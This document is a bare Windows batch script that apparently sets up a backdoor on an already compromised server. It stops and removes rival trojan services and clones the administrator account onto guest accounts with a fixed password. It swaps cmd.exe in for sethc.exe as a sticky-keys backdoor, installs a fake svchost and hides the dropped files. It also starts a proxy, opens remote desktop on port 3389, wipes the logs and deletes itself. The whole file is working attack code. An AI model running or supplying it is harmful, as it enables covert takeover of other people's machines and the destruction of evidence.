@echo off
@net1 stop sharedaccess
@net1 stop DLLHOST32
@net1 stop Windowservices
@net1 stop Messagerp
@net1 stop Messager
@net1 stop Messanger
@net1 stop MDD
@net1 stop WinDnser
@Aio.exe -RemoveService dudu
@Aio.exe -RemoveService Nois
@Aio.exe -RemoveService MDD
@Aio.exe -RemoveService Windows_Server
@Aio.exe -RemoveService Windows_systemupdate2007_771
@Aio.exe -RemoveService vEvilotus
@Aio.exe -RemoveService system
@Aio.exe -RemoveService GrayPigeon_Hacker.com.cn
@Aio.exe -RemoveService Messager
@Aio.exe -RemoveService Messanger
@Aio.exe -RemoveService Ntmsvc
@Aio.exe -RemoveService ianmanworkstawio
@Aio.exe -RemoveService MicerDns
@Aio.exe -RemoveService WinDnser
@Aio.exe -RemoveService sharedaccess
@Aio.exe -RemoveService DLLHOST32
@Aio.exe -RemoveService Windowservices
@Aio.exe -RemoveService Messagerp
@aio.exe -clone administrator guest 1234569qw,
@aio.exe -clone administrator TsinternetUser 1234569qw,
@del %SYSTEMROOT%\servicepackfiles\i386\tftp.exe
@del %SYSTEMROOT%\system32\dllcache\tftp.exe
@del %SYSTEMROOT%\system32\tftp.exe
@copy %SYSTEMROOT%\system32\cscript.exe %SYSTEMROOT%\system32\csc.exe
@del %SYSTEMROOT%\servicepackfiles\i386\cscript.exe
@del %SYSTEMROOT%\system32\dllcache\cscript.exe
@del %SYSTEMROOT%\system32\cscript.exe
@copy %SYSTEMROOT%\system32\ftp.exe %SYSTEMROOT%\system32\fp.exe
@del %SYSTEMROOT%\servicepackfiles\i386\ftp.exe
@del %SYSTEMROOT%\system32\dllcache\ftp.exe
@del %SYSTEMROOT%\system32\ftp.exe
@copy %SYSTEMROOT%\system32\cmd.exe %SYSTEMROOT%\system32\sethc.exe /y
@copy %SYSTEMROOT%\system32\sethc.exe %SYSTEMROOT%\system32\dllcache\sethc.exe /y
@svchost -install
@regedit /s server.reg
@attrib +s +h svchost.exe
@attrib +s +h AccInfo.ini
@attrib +s +h CCProxy.ini
@attrib +s +h Language
@attrib +s +h Log
@attrib +s +h web
@net1 start CCProxy
@del server.reg 
@del c:\2003.exe 
@del 1.vbs 
@aio.exe -terminal 3389
@aio -cleanlog
@del aio.exe
@del %0

